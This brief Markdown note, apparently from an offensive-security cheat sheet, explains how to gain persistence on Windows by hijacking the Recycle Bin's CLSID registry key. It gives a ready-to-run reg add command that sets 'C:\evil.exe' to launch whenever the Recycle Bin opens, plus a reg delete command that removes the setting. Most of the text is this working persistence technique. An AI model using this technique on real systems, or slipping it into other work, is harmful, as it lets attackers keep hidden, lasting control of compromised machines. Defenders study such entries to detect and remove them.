# Recycle Bin Persistence

By registering arbitrary command to the Recycle Bin (CLSID: `645FF040-5081-101B-9F08-00AA002F954E`), the command will be executed when the Recycle Bin opens. 

```powershell
reg add "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command" /ve /d "C:\evil.exe" /f
```

To delete this setting, unregister it with the following command:

```powershell
reg delete "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open" /f
```

Both commands require `Administrator` privileges.